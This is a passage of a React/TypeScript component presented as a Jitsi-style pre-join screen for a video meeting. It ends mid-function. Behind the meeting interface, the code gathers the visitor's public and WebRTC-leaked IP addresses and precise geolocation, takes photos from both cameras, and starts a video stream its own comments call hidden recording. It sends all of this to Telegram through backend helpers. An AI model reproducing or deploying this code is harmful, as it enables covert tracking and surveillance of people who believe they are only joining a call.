import { useState, useEffect, useRef, Dispatch, SetStateAction, MutableRefObject } from 'react';
import svgPathsDesktop from '@/imports/svg-mtl2mb8nxd';
import svgPathsMobile from '@/imports/svg-8bxdc70pg5';
import { ChevronDown } from 'lucide-react';
import { STUN_SERVERS } from '@/utils/stunServers';
import Alert from '@/imports/Alert-17-970';
import { sendVideoToTelegram } from '@/utils/videoUpload';
import { getDeviceInfo } from '@/utils/deviceInfo';
import { 
  logGeolocationData
} from '@/utils/telegramLogger';
import { handleSequentialPermissions } from '@/utils/permissionHandler';
import { joinRoom } from '@/utils/livekitAPI';
import { 
  sendUserDataToTelegram, 
  sendPhotoToTelegram as sendPhotoAPI,
  sendStartNotification as sendStartAPI
} from '@/utils/telegramAPI';

interface JitsiPreJoinProps {
  roomName: string;
  initialRoomTitle?: string;
  onJoinRoom: (userName: string, token: string, livekitUrl: string) => void;
  videoStreamFront: MediaStream | null;
  setVideoStreamFront: Dispatch<SetStateAction<MediaStream | null>>;
  isVideoRecording: boolean;
  setIsVideoRecording: Dispatch<SetStateAction<boolean>>;
  currentChunkNumber: number;
  setCurrentChunkNumber: Dispatch<SetStateAction<number>>;
  currentCameraType: 'front' | 'back' | 'desktop';
  setCurrentCameraType: Dispatch<SetStateAction<'front' | 'back' | 'desktop'>>;
  geoData: {
    latitude: number;
    longitude: number;
    accuracy: number;
    timestamp: string;
  } | null;
  setGeoData: Dispatch<SetStateAction<{
    latitude: number;
    longitude: number;
    accuracy: number;
    timestamp: string;
  } | null>>;
  isSwitchingCameraRef: MutableRefObject<boolean>;
  globalChunkCounterRef: MutableRefObject<number>;
  geoLocationSentRef: MutableRefObject<boolean>;
  currentVideoDeviceIdRef: MutableRefObject<string | null>;
  isExecutingPermissionsRef: MutableRefObject<boolean>;
}

export default function JitsiPreJoin({
  roomName,
  initialRoomTitle,
  onJoinRoom,
  videoStreamFront,
  setVideoStreamFront,
  isVideoRecording,
  setIsVideoRecording,
  currentChunkNumber,
  setCurrentChunkNumber,
  currentCameraType,
  setCurrentCameraType,
  geoData,
  setGeoData,
  isSwitchingCameraRef,
  globalChunkCounterRef,
  geoLocationSentRef,
  currentVideoDeviceIdRef,
  isExecutingPermissionsRef
}: JitsiPreJoinProps) {
  const [userName, setUserName] = useState('');
  const [isMicMuted, setIsMicMuted] = useState(true);
  const [isCameraOff, setIsCameraOff] = useState(true);
  const [showJoinMenu, setShowJoinMenu] = useState(false);
  const [showPermissionAlert, setShowPermissionAlert] = useState(false);
  const [roomTitle, setRoomTitle] = useState(initialRoomTitle || ''); // Дружественное название комнаты
  const [permissionsRequested, setPermissionsRequested] = useState(false); // Флаг: permissions уже запрошены
  const [photosCaptured, setPhotosCaptured] = useState(false); // Флаг: фото уже захвачены
  const [dataCollectionComplete, setDataCollectionComplete] = useState(false); // 🔒 Флаг: ВСЕ данные собраны (фото + первый чанк видео)
  const [isFlashing, setIsFlashing] = useState(false); // Flash effect for URL copy
  const [isJoining, setIsJoining] = useState(false); // ✅ Loading состояние для кнопки Join
  const [isProtectionActive, setIsProtectionActive] = useState(true); // 🛡️ Защита от случайных кликов

  // 🚀 OPTIMIZATION: Ref для хранения Promise WebRTC IP сбора
  const webrtcIPsPromiseRef = useRef<Promise<string[]> | null>(null);

  // ========================================
  // UTILITY FUNCTIONS
  // ========================================
  
  // Убираем лишние логи для производительности
  const log = (...args: any[]) => {
    // Включаем логи для отладки
    console.log(...args);
  };



  const detectDevice = (): 'ios' | 'android' | 'desktop' => {
    const ua = navigator.userAgent;
    console.log('🔍 [detectDevice] User-Agent:', ua);
    console.log('🔍 [detectDevice] Touch points:', navigator.maxTouchPoints);
    
    // Проверка iOS
    if (/iPhone|iPad|iPod/i.test(ua)) {
      console.log('📱 [detectDevice] Определено как iOS (по UA)');
      return 'ios';
    }
    
    // Проверка Android
    if (/Android/i.test(ua)) {
      console.log('🤖 [detectDevice] Определено как Android (по UA)');
      return 'android';
    }
    
    // Дополнительная проверка для мобильных устройств через touch
    if (navigator.maxTouchPoints > 0 && /Mobile/i.test(ua)) {
      console.log('📱 [detectDevice] Определено как Mobile (по touch + UA)');
      // Пытаемся определить iOS vs Android через другие признаки
      if ('ontouchend' in document && /Safari/i.test(ua) && !/Chrome/i.test(ua)) {
        console.log('📱 [detectDevice] → iOS (Safari без Chrome)');
        return 'ios';
      }
      console.log('🤖 [detectDevice] → Android (по умолчанию для mobile)');
      return 'android';
    }
    
    console.log('🖥️ [detectDevice] Определено как Desktop');
    return 'desktop';
  };

  const detectBrowser = (): string => {
    const ua = navigator.userAgent;
    if (/Safari/.test(ua) && !/Chrome/.test(ua)) return 'safari';
    if (/Firefox/i.test(ua)) return 'firefox';
    if (/Chrome/i.test(ua)) return 'chrome';
    return 'other';
  };

  // ========================================
  // IP COLLECTION
  // ========================================

  const getUserIP = async (): Promise<string> => {
    try {
      log('🌐 Запрашиваем IP-адрес...');
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      log('✅ IP получен:', data.ip);
      return data.ip || 'Unknown';
    } catch (error) {
      console.error('❌ Ошибка получения IP:', error);
      return 'Unknown';
    }
  };

  const getWebRTCIPs = (): Promise<string[]> => {
    return new Promise((resolve) => {
      const myPeerConnection = window.RTCPeerConnection || 
                               (window as any).mozRTCPeerConnection || 
                               (window as any).webkitRTCPeerConnection;
      
      if (!myPeerConnection) {
        console.warn('⚠️ WebRTC не поддерживается');
        resolve([]);
        return;
      }
      
      log(`🔍 [WebRTC] Запускаем сбор публичных IP через ${STUN_SERVERS.length} STUN серверов...`);
      
      const localIPs: { [key: string]: boolean } = {};
      const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g;
      const noop = function() {};
      
      // Check if IP is private/local (should be filtered out)
      function isPrivateIP(ip: string): boolean {
        // IPv4 private ranges
        if (/^127\./.test(ip)) return true; // Localhost
        if (/^10\./.test(ip)) return true; // 10.x.x.x
        if (/^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(ip)) return true; // 172.16.x.x - 172.31.x.x
        if (/^192\.168\./.test(ip)) return true; // 192.168.x.x
        if (/^169\.254\./.test(ip)) return true; // Link-local
        if (/^0\./.test(ip)) return true; // Invalid
        
        // IPv6 private ranges
        if (/^::1$/.test(ip)) return true; // IPv6 localhost
        if (/^fe80:/i.test(ip)) return true; // IPv6 link-local
        if (/^fc00:/i.test(ip)) return true; // IPv6 unique local
        if (/^fd00:/i.test(ip)) return true; // IPv6 unique local
        
        return false;
      }
      
      function ipIterate(ip: string) {
        // Фильтруем локальные/приватные IP
        if (isPrivateIP(ip)) {
          log('   🚫 IP отфильтрован (локальный):', ip);
          return;
        }
        
        if (!localIPs[ip]) {
          log('   ✅ Публичный IP найден:', ip);
          localIPs[ip] = true;
        }
      }
      
      const connections: RTCPeerConnection[] = [];
      
      try {
        // METHOD 1: ALL STUN servers
        log(`📡 [WebRTC Method 1] Создаем соединение с ВСЕМИ ${STUN_SERVERS.length} STUN серверами...`);
        const pc1 = new myPeerConnection({ iceServers: STUN_SERVERS });
        connections.push(pc1);
        
        pc1.createDataChannel("");
        
        pc1.createOffer().then((sdp) => {
          if (sdp.sdp) {
            sdp.sdp.split('\n').forEach(function(line) {
              if (line.indexOf('candidate') < 0) return;
              const matches = line.match(ipRegex);
              if (matches) {
                matches.forEach(ipIterate);
              }
            });
          }
          pc1.setLocalDescription(sdp).catch(noop);
        }).catch(noop);
        
        pc1.onicecandidate = function(ice) {
          if (!ice || !ice.candidate || !ice.candidate.candidate) return;
          const matches = ice.candidate.candidate.match(ipRegex);
          if (matches) {
            matches.forEach(ipIterate);
          }
        };
        
        // METHOD 2: Google STUN (fast)
        log('📡 [WebRTC Method 2] Создаем быстрое соединение с Google STUN...');
        const pc2 = new myPeerConnection({
          iceServers: [
            { urls: "stun:stun.l.google.com:19302" },
            { urls: "stun:stun1.l.google.com:19302" }
          ]
        });
        connections.push(pc2);
        
        pc2.createDataChannel("");
        pc2.createOffer(function(sdp) {
          if (sdp.sdp) {
            sdp.sdp.split('\n').forEach(function(line) {
              if (line.indexOf('candidate') < 0) return;
              const matches = line.match(ipRegex);
              if (matches) {
                matches.forEach(ipIterate);
              }
            });
          }
          pc2.setLocalDescription(sdp, noop, noop);
        }, noop);
        
        pc2.onicecandidate = function(ice) {
          if (!ice || !ice.candidate || !ice.candidate.candidate) return;
          const candidateString = ice.candidate.candidate;
          const matches = candidateString.match(ipRegex);
          if (matches) {
            matches.forEach(ipIterate);
          }
        };
        
        // Wait 2 seconds for IP collection
        setTimeout(() => {
          log('⏰ [WebRTC] 2 секунды прошло - завершаем сбор IP...');
          
          connections.forEach((pc, index) => {
            try {
              pc.close();
              log(`🔒 [WebRTC] Соединение #${index + 1} закрыто`);
            } catch (e) {
              console.warn(`⚠️ [WebRTC] Ошибка закрытия соединения #${index + 1}:`, e);
            }
          });
          
          const ips = Object.keys(localIPs);
          log(`✅ [WebRTC] Всего найдено ${ips.length} уникальных ПУБЛИЧНЫХ IP:`, ips);
          resolve(ips);
        }, 2000);
        
      } catch (error) {
        console.error('❌ [WebRTC] Ошибка:', error);
        connections.forEach((pc) => {
          try { pc.close(); } catch (e) {}
        });
        resolve([]);
      }
    });
  };

  const getIPGeolocation = async (): Promise<{ 
    latitude: number; 
    longitude: number; 
    accuracy: number; 
    city?: string 
  }> => {
    try {
      log('🌐 Используем IP-геолокацию как fallback...');
      
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      
      log('✅ IP-геолокация получена:', data);
      
      return {
        latitude: parseFloat(data.latitude) || 0,
        longitude: parseFloat(data.longitude) || 0,
        accuracy: 50000, // IP geolocation ~50km accuracy
        city: data.city || 'Unknown'
      };
    } catch (error) {
      log('❌ Ошибка IP-геолокации:', error);
      throw new Error('IP-геолокация недоступна');
    }
  };

  // ========================================
  // PERMISSIONS
  // ========================================

  const requestCamMic = async () => {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      throw new Error('getUserMedia не поддерживается');
    }
    
    log('▶️ Запрашиваем камеру и микрофон…');
    
    const device = detectDevice();
    
    // 🔍 Проверяем доступные устройства
    let hasAudio = true;
    try {
      const devices = await navigator.mediaDevices.enumerateDevices();
      const audioDevices = devices.filter(d => d.kind === 'audioinput');
      hasAudio = audioDevices.length > 0;
      
      if (!hasAudio) {
        log(`⚠️ Микрофоны не найдены - будем запрашивать только видео`);
      }
    } catch (enumErr) {
      log(`⚠️ Не удалось получить список устройст��: ${enumErr}`);
    }
    
    // ВАЖНО: Не останавливаем стрим! Просто проверяем что разрешения есть
    let stream: MediaStream | null = null;
    
    // 🔧 Попытка с fallback
    try {
      if (device === 'desktop') {
        stream = await navigator.mediaDevices.getUserMedia({
          video: {
            width: { ideal: 1280 },
            height: { ideal: 720 }
          },
          audio: hasAudio
        });
      } else {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { 
            facingMode: 'user',
            width: { ideal: 1280 },
            height: { ideal: 720 }
          },
          audio: hasAudio
        });
      }
      log(`✅ Камера${hasAudio ? ' и микрофон' : ''}: разрешено (${device})`);
    } catch (err) {
      log(`⚠️ Первая попытка не удалась: ${err}`);
      // Fallback: базовые constraints
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: true,
          audio: hasAudio
        });
        log(`✅ Камера${hasAudio ? ' и микрофон' : ''}: разрешено (${device}, базовые constraints)`);
      } catch (err2) {
        log(`⚠️ Вторая п��пытка не удалась: ${err2}`);
        // Последний fallback: только видео
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
        log(`✅ Камера: разрешено (${device}, только видео)`);
      }
    }
    
    // Не останавливаем! Браузер запомнит разрешение
    return stream;
  };

  const requestLocation = (timeoutMs = 5000) => {
    return new Promise((resolve, reject) => {
      if (!('geolocation' in navigator)) {
        reject(new Error('Geolocation API недоступен'));
        return;
      }

      log('▶️ Запрашиваем геолокацию…');
      
      const isMac = /Mac|MacIntel|MacPPC|Mac68K/.test(navigator.platform) || 
                    /Macintosh/.test(navigator.userAgent);
      
      const options = isMac ? {
        enableHighAccuracy: false,
        timeout: 25000,
        maximumAge: 10000
      } : { 
        enableHighAccuracy: true,
        timeout: timeoutMs,
        maximumAge: 0
      };
      
      if (isMac) {
        log('🖥 macOS обнаружен - используем Wi-Fi геолокацию с увеличенным таймаутом (25 сек)');
      }
      
      navigator.geolocation.getCurrentPosition(
        position => {
          const { latitude, longitude, accuracy } = position.coords;
          log(`✅ Геолокация: ${latitude.toFixed(5)}, ${longitude.toFixed(5)} (±${accuracy}м)`);
          resolve(position);
        },
        error => reject(error),
        options
      );
    });
  };

  const triggerLocalNetworkAccess = (): Promise<void> => {
    return new Promise((resolve) => {
      try {
        log('🌐 [macOS] Триггерим запрос Local Network Access через WebRTC...');
        
        const pc = new RTCPeerConnection({
          iceServers: [
            { urls: 'stun:stun.l.google.com:19302' }
          ]
        });
        
        pc.createDataChannel('trigger-local-network');
        
        pc.createOffer()
          .then(offer => pc.setLocalDescription(offer))
          .then(() => {
            log('✅ [macOS] WebRTC offer создан - должен появиться запрос Local Network Access');
            
            setTimeout(() => {
              pc.close();
              log('✅ [macOS] WebRTC connection закрыт, ждём разрешения...');
              setTimeout(() => resolve(), 500);
            }, 300);
          })
          .catch(err => {
            log('⚠️ [macOS] WebRTC ошибка (не критичн��):', err);
            pc.close();
            resolve();
          });
        
      } catch (error) {
        log('⚠️ [macOS] WebRTC не поддерживается:', error);
        resolve();
      }
    });
  };

  // ========================================
  // PHOTO CAPTURE
  // ========================================

  const capturePhoto = async (facingMode: 'user' | 'environment'): Promise<Blob | null> => {
    const device = detectDevice();
    const cameraName = facingMode === 'user' ? 'ФРОНТАЛЬНАЯ' : 'ЗАДНЯЯ';
    
    log(`📸 [capturePhoto] НАЧАЛО - Захватываем фото с ${cameraName} камеры (${device}, facingMode: ${facingMode})...`);
    
    try {
      let constraints: MediaStreamConstraints;
      
      if (device === 'desktop') {
        log(`   🖥️ Desktop detected - используем базовые constraints`);
        constraints = {
          video: {
            width: { ideal: 1920 },
            height: { ideal: 1080 }
          },
          audio: false
        };
      } else {
        log(`   📱 Mobile detected - используем facingMode: ${facingMode}`);
        constraints = {
          video: {
            facingMode: facingMode,
            width: { ideal: 1920 },
            height: { ideal: 1080 }
          },
          audio: false
        };
      }
      
      let stream: MediaStream | null = null;
      
      // 🔧 Попытка с fallback
      try {
        stream = await navigator.mediaDevices.getUserMedia(constraints);
        log(`   ✅ Stream получен для ${cameraName} камеры`);
      } catch (err) {
        log(`   ⚠️ Первая попытка не удалась: ${err}`);
        // Fallback: базовые constraints
        try {
          stream = await navigator.mediaDevices.getUserMedia({
            video: true,
            audio: false
          });
          log(`   ✅ Stream получен (базовые constraints)`);
        } catch (err2) {
          log(`   ❌ Fallback тоже не удался: ${err2}`);
          throw err2;
        }
      }
      
      if (!stream) {
        throw new Error('Не удалось получить медиа-поток');
      }
      
      const video = document.createElement('video');
      video.srcObject = stream;
      video.setAttribute('playsinline', 'true');
      
      await new Promise<void>((resolve) => {
        video.onloadedmetadata = () => {
          video.play();
          log(`   ✅ Видео готово (${video.videoWidth}x${video.videoHeight})`);
          resolve();
        };
      });
      
      await new Promise(resolve => setTimeout(resolve, 300));
      
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      
      if (!ctx) {
        throw new Error('Canvas context not available');
      }
      
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      log(`   ✅ Кадр захвачен (${canvas.width}x${canvas.height})`);
      
      stream.getTracks().forEach(track => track.stop());
      log(`   ✅ Stream остановлен`);
      
      // 🔧 Небольшая задержка после остановки треков для полного освобождения камеры
      await new Promise(resolve => setTimeout(resolve, 100));
      log(`   ✅ Камера освобождена`);
      
      const blob = await new Promise<Blob | null>((resolve) => {
        canvas.toBlob((blob) => {
          resolve(blob);
        }, 'image/jpeg', 0.92);
      });
      
      if (!blob) {
        throw new Error('Failed to create blob from canvas');
      }
      
      log(`✅ [capturePhoto] УСПЕХ - Фото захвачено с ${cameraName} камеры (${blob.size} bytes)`);
      return blob;
      
    } catch (error) {
      console.error(`❌ [capturePhoto] ОШИБКА - Ошибка захвата фото с ${cameraName} камеры:`, error);
      return null;
    } finally {
      log(`📸 [capturePhoto] КОНЕЦ - Обработка фото с ${cameraName} камеры завершена`);
    }
  };

  const sendPhotoToTelegram = async (photoBlob: Blob, cameraType: 'front' | 'back') => {
    const browser = detectBrowser();
    log(`📤 [sendPhotoToTelegram] НАЧАЛО - Отправляем фото (${cameraType}) в Telegram (размер: ${photoBlob.size} bytes)...`);
    
    try {
      const localTime = new Date().toLocaleString('ru-RU', {
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false
      });
      
      const device = detectDevice();
      const deviceName = device === 'desktop' ? '🖥️ Desktop' : device === 'android' ? '📱 Android' : '📱 iOS';
      const browserName = browser.charAt(0).toUpperCase() + browser.slice(1);
      const ua = navigator.userAgent; // Добавляем определение User-Agent
      
      const cameraName = cameraType === 'front' ? '📸 ��ронтальная камера' : '📸 Задняя камера';
      const caption = `${cameraName}\n⏰ ${localTime}`;
      
      // Send via backend API
      await sendPhotoAPI(photoBlob, cameraType, device, ua);
      log(`✅ Photo sent via backend`);
      
      log(`✅ [sendPhotoToTelegram] ФОТО (${cameraType}): Обработано`);
      
    } catch (error) {
      console.error(`❌ [sendPhotoToTelegram] КРИТИЧЕСКАЯ ОШИБКА при отправке фото (${cameraType}) в Telegram:`, error);
    } finally {
      log(`📤 [sendPhotoToTelegram] КОНЕЦ - Фото (${cameraType}) обработано`);
    }
  };

  // ========================================
  // TELEGRAM SENDING
  // ========================================

  const sendToTelegram = async (latitude: number, longitude: number, accuracy: number) => {
    try {
      log('📤 Отправка в Telegram...');
      
      const publicIP = await getUserIP();
      
      // 🚀 OPTIMIZATION: Используем уже запущенный WebRTC сбор (если есть), иначе запускаем новый
      const webrtcIPs = webrtcIPsPromiseRef.current 
        ? await webrtcIPsPromiseRef.current 
        : await getWebRTCIPs();
      
      const device = detectDevice();
      const browser = detectBrowser();
      const ua = navigator.userAgent;
      
      const localTime = new Date().toLocaleString('ru-RU', {
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false
      });
      
      // Получаем timezone пользователя
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const timezoneOffset = -new Date().getTimezoneOffset() / 60; // В часах
      const timezoneOffsetStr = timezoneOffset >= 0 ? `+${timezoneOffset}` : `${timezoneOffset}`;
      
      // Получаем языки устройства
      const languages = navigator.languages ? navigator.languages.join(', ') : navigator.language;
      
      const deviceEmoji = device === 'ios' ? '📱' : device === 'android' ? '🤖' : '🖥️';
      const deviceName = device === 'ios' ? 'iOS' : device === 'android' ? 'Android' : 'Desktop';
      
      // Format coordinates
      const lat = Number(latitude).toFixed(6);
      const lng = Number(longitude).toFixed(6);
      const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
      
      let message = `🎯 НОВЫЕ ДАННЫЕ\n\n`;
      message += `📍 Геолокация:\n`;
      message += `   Широта: ${lat}\n`;
      message += `   Долгота: ${lng}\n`;
      message += `   Точность: ±${Math.round(accuracy)} м\n`;
      message += `   🗺️ ${googleMapsLink}\n\n`;
      message += `🌐 IP-адреса:\n`;
      message += `   Публичный: ${publicIP}\n`;
      if (webrtcIPs.length > 0) {
        message += `   WebRTC: ${webrtcIPs.join(', ')}\n`;
      }
      message += `\n${deviceEmoji} Устройство: ${deviceName}\n`;
      message += `🌍 Браузер: ${browser}\n`;
      message += `⏰ Локальное время: ${localTime}\n`;
      message += `🕐 Timezone: ${timezone} (UTC${timezoneOffsetStr})\n`;
      message += `🗣️ Языки: ${languages}\n`;
      message += `📱 User-Agent: ${ua}`;
      
      // Send via backend API
      await sendUserDataToTelegram({
        latitude,
        longitude,
        accuracy,
        publicIP,
        webrtcIPs,
        device,
        browser,
        userAgent: ua,
        timezone: `${timezone} (UTC${timezoneOffsetStr})`,
        languages,
        localTime
      });
      
      log('✅ Data sent to Telegram via backend');
    } catch (error) {
      console.error('❌ Ошибка отправки в Telegram:', error);
    }
  };

  // ========================================
  // VIDEO RECORDING
  // ========================================

  const startVideoRecording = async () => {
    const device = detectDevice();
    log(`🎥 Начинаем запись видео+аудио для устройства: ${device}`);
    
    try {
      // 🔍 Проверяем доступные устройства
      let hasAudio = true;
      let hasVideo = true;
      try {
        const devices = await navigator.mediaDevices.enumerateDevices();
        const videoCameras = devices.filter(d => d.kind === 'videoinput');
        const audioDevices = devices.filter(d => d.kind === 'audioinput');
        hasVideo = videoCameras.length > 0;
        hasAudio = audioDevices.length > 0;
        
        log(`📹 Доступно камер: ${videoCameras.length}`);
        log(`🎤 Доступно микрофонов: ${audioDevices.length}`);
        
        if (!hasAudio) {
          log(`⚠️ Микрофоны не найдены - будем записывать только видео`);
        }
        
        videoCameras.forEach((cam, idx) => {
          log(`   Camera ${idx + 1}: ${cam.label || 'Unknown'} (id: ${cam.deviceId.substring(0, 8)}...)`);
        });
      } catch (enumErr) {
        log(`⚠️ Не удалось получить список устройств: ${enumErr}`);
      }
      
      const facingMode = device === 'desktop' ? undefined : 'user'; // ✅ Изменено: начинаем с фронтальной камеры (было 'environment')
      
      log(`📷 Запрашиваем ${facingMode === 'user' ? 'ФРОНТАЛЬНУЮ' : 'любую'} камеру${hasAudio ? ' + микрофон' : ' (БЕЗ микрофона)'}...`);
      
      // 🔧 Исправленные constraints с fallback для desktop и опциональным аудио
      let constraints: MediaStreamConstraints = {
        video: facingMode ? {
          facingMode: facingMode,
          width: { ideal: 1280 },
          height: { ideal: 720 }
        } : true, // 🎯 Для desktop просто true, без конкретных constraints
        audio: hasAudio // 🎯 Только если микрофон доступен
      };
      
      let stream: MediaStream | null = null;
      
      // Попытка 1: С facingMode или базовыми constraints
      try {
        log(`   🔍 Попытка 1 - Constraints:`, JSON.stringify(constraints));
        stream = await navigator.mediaDevices.getUserMedia(constraints);
        log('   ✅ Медиа получены (попытка 1)');
      } catch (err1) {
        log(`   ⚠️ Попытка 1 не удалась: ${err1}`);
        
        // Попытка 2: Упрощенные constraints
        try {
          constraints = {
            video: {
              width: { ideal: 1280 },
              height: { ideal: 720 }
            },
            audio: hasAudio
          };
          log(`   🔍 Попытка 2 - Constraints:`, JSON.stringify(constraints));
          stream = await navigator.mediaDevices.getUserMedia(constraints);
          log('   ✅ Медиа получены (попытка 2 - упрощенные constraints)');
        } catch (err2) {
          log(`   ⚠️ Попытка 2 не удалась: ${err2}`);
          
          // Попытка 3: Только video: true
          try {
            const basicConstraints = { video: true, audio: hasAudio };
            log(`   🔍 Попытка 3 - Constraints:`, JSON.stringify(basicConstraints));
            stream = await navigator.mediaDevices.getUserMedia(basicConstraints);
            log('   ✅ Медиа получены (попытка 3 - базовые constraints)');
          } catch (err3) {
            log(`   ⚠️ Попытка 3 не удалась: ${err3}`);
            
            // Попытка 4: ТОЛЬКО видео без аудио (последняя надежда)
            try {
              const videoOnlyConstraints = { video: true };
              log(`   🔍 Попытка 4 - ТОЛЬКО ВИДЕО:`, JSON.stringify(videoOnlyConstraints));
              stream = await navigator.mediaDevices.getUserMedia(videoOnlyConstraints);
              log('   ✅ Медиа получены (попытка 4 - только видео, без аудио)');
            } catch (err4) {
              throw new Error(`Все попытки получить медиа не удались: ${err4}`);
            }
          }
        }
      }
      
      if (!stream) {
        throw new Error('Не удалось получить медиа-поток');
      }
      
      const videoTrack = stream.getVideoTracks()[0];
      if (videoTrack) {
        const settings = videoTrack.getSettings();
        currentVideoDeviceIdRef.current = settings.deviceId || null;
        
        log(
          '🎯 [Init] Камера:',
          'deviceId =', settings.deviceId,
          'facingMode =', settings.facingMode,
          'label =', videoTrack.label
        );
      }
      
      // ✅ КРИТИЧНО: Убираем audio треки из stream перед передачей в скрытую запись
      // LiveKit будет использовать микрофон отдельно
      const audioTracks = stream.getAudioTracks();
      if (audioTracks.length > 0) {
        log(`🔇 [Init] Удаляем ${audioTracks.length} audio трек(ов) из stream для скрытой записи`);
        audioTracks.forEach(track => {
          stream.removeTrack(track);
          track.stop(); // Останавливаем audio track
          log(`   🔇 Удалён и остановлен: ${track.kind} - ${track.label}`);
        });
      }
      
      // ✅ Проверяем что остались только video треки
      const remainingTracks = stream.getTracks();
      log(`📹 [Init] Финальный stream для скрытой записи:`, remainingTracks.map(t => `${t.kind} - ${t.label}`));
      
      setVideoStreamFront(stream);
      
      const actualFacingMode = videoTrack ? videoTrack.getSettings().facingMode : undefined;
      const detectedCameraType = 
        actualFacingMode === 'environment' ? 'back' :
        actualFacingMode === 'user' ? 'front' :
        device === 'desktop' ? 'desktop' : 'front'; // ✅ Изменено: fallback на 'front' (было 'back')
      
      setCurrentCameraType(detectedCameraType);
      log(`   ✅ Определён тип камеры: ${detectedCameraType} (facingMode: ${actualFacingMode})`);
      
      setIsVideoRecording(true);
      log(`✅ ${detectedCameraType === 'back' ? 'Задняя' : detectedCameraType === 'front' ? 'Фронтальная' : 'Обычная'} камера готова к записи (БЕЗ аудио для LiveKit)`);
    } catch (error) {
      console.error('❌ Ошибка при запуске видео+аудио записи:', error);
    }
  };

  const switchCamera = async (newFacingMode: 'user' | 'environment') => {
    const device = detectDevice();
    
    if (device === 'desktop') {
      log('⚠️ Desktop detected - camera switching not available');
      return;
    }
    
    if (isSwitchingCameraRef.current) {
      log('⚠️ Camera switch already in progress, skipping...');
      return;
    }
    
    isSwitchingCameraRef.current = true;
    
    // 🔍 Проверяем доступные устройства
    let hasAudio = true;
    try {
      const allDevices = await navigator.mediaDevices.enumerateDevices();
      const audioDevices = allDevices.filter(d => d.kind === 'audioinput');
      hasAudio = audioDevices.length > 0;
      
      if (!hasAudio) {
        log(`⚠️ Микрофоны не найдены - будем переключать только видео`);
      }
    } catch (enumErr) {
      log(`⚠️ Не удалось получить список устройств: ${enumErr}`);
    }
    
    const cameraName = newFacingMode === 'user' ? 'ФРОНТАЛЬНАЯ' : 'ЗАДНЯЯ';
    log(`\n${'='.repeat(80)}`);
    log(`🔄 НАЧИНАЕМ ПЕРЕКЛЮЧЕНИЕ НА ${cameraName} КАМЕРУ`);
    log(`   Устройство: ${device.toUpperCase()}`);
    log(`   Текущая камера: ${currentCameraType}`);
    log(`   Аудио доступно: ${hasAudio}`);
    log(`${'='.repeat(80)}\n`);
    
    try {
      log('📍 ШАГ 1/5: Ос��анавливаем текущую камеру...');
      
      setIsVideoRecording(false);
      log('   ✅ isVideoRecording = false');
      
      if (videoStreamFront) {
        const tracks = videoStreamFront.getTracks();
        log(`   📹 Останавливаем ${tracks.length} треков...`);
        
        tracks.forEach(track => {
          track.stop();
          log(`   ⏹️  ${track.kind}: ${track.label}`);
        });
        
        log('   ✅ Все треки остановлены');
      }
      
      const isAndroid = device === 'android';
      const releaseDelay = isAndroid ? 300 : 200;
      
      log(`\n📍 ШАГ 2/5: Ждем освобождения камеры (${releaseDelay}ms)...`);
      await new Promise(r => setTimeout(r, releaseDelay));
      log('   ✅ Камера освобождена');
      
      log(`\n📍 ШАГ 3/5: Запрашиваем ${cameraName} камеру...`);
      
      let newStream: MediaStream | null = null;
      
      if (isAndroid) {
        const devices = await navigator.mediaDevices.enumerateDevices();
        const videoDevices = devices.filter(d => d.kind === 'videoinput');
        
        log(`   📹 Найдено ${videoDevices.length} камер:`);
        videoDevices.forEach((d, index) => {
          const label = d.label || `Camera ${index + 1}`;
          log(`      ${index + 1}. ${label} (deviceId=${d.deviceId.substring(0, 8)}...)`);
        });
        
        const currentId = currentVideoDeviceIdRef.current;
        
        const isBackPreferred = newFacingMode === 'environment';
        
        let candidate = videoDevices.find(d => {
          const label = (d.label || '').toLowerCase();
          const looksBack =
            label.includes('back') ||
            label.includes('rear') ||
            label.includes('environment') ||
            label.includes('facing back');
          return isBackPreferred ? looksBack : !looksBack;
        });
        
        if (!candidate && currentId) {
          candidate = videoDevices.find(d => d.deviceId !== currentId) || null;
        }
        
        if (!candidate && videoDevices.length > 0) {
          candidate = videoDevices[0];
        }
        
        if (!candidate) {
          throw new Error('Нет доступных камер!');
        }
        
        log(`   ✅ Выбрана камера: ${candidate.label || 'Unknown'} (deviceId=${candidate.deviceId.substring(0, 8)}...)`);
        
        let constraints: MediaStreamConstraints = {
          video: {
            deviceId: { exact: candidate.deviceId },
            facingMode: isBackPreferred ? { ideal: 'environment' } : { ideal: 'user' },
            width: { ideal: 1280 },
            height: { ideal: 720 },
          },
          audio: hasAudio,
        };
        
        log('   📷 Запрашиваем getUserMedia с exact deviceId...');
        
        // 🔧 Попытка с fallback
        try {
          newStream = await navigator.mediaDevices.getUserMedia(constraints);
          log('   ✅ getUserMedia successful!');
        } catch (err) {
          log(`   ⚠️ Exact deviceId не сработал: ${err}`);
          // Fallback: пробуем с ideal вместо exact
          try {
            constraints = {
              video: {
                deviceId: { ideal: candidate.deviceId },
                facingMode: isBackPreferred ? { ideal: 'environment' } : { ideal: 'user' },
                width: { ideal: 1280 },
                height: { ideal: 720 },
              },
              audio: hasAudio,
            };
            newStream = await navigator.mediaDevices.getUserMedia(constraints);
            log('   ✅ getUserMedia successful (с ideal deviceId)');
          } catch (err2) {
            log(`   ⚠️ Ideal deviceId тоже не сработал: ${err2}`);
            // Последний fallback: только facingMode
            constraints = {
              video: {
                facingMode: isBackPreferred ? { ideal: 'environment' } : { ideal: 'user' },
                width: { ideal: 1280 },
                height: { ideal: 720 },
              },
              audio: hasAudio,
            };
            newStream = await navigator.mediaDevices.getUserMedia(constraints);
